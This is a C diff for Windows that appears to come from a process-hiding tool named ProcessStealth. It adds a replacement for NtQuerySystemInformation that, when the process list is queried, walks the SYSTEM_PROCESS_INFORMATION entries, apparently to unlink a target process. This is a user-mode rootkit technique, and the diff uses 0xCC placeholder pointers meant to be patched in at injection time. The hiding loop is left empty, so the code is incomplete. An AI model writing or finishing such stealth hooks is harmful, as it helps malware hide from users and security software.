@@ -67,7 +67,26 @@ BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
 
 }
 
-void HookFunction()
+NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    
+    volatile BYTE (NTAPI *CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
+    volatile wchar_t *HideProcessName = 0xCCCCCCCCCCCCCCCC;
+    NTSTATUS ntstatus = CloneNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+
+    if (ntstatus != STATUS_SUCCESS)
+    {
+        return ntstatus;
+    }
+
+    if (SystemInformationClass == 5)
+    {
+        PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
+        PSYSTEM_PROCESS_INFORMATION pPrev = NULL;
+        pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
+
+        while (TRUE)
+        {
+            
+        }
+    }
 }
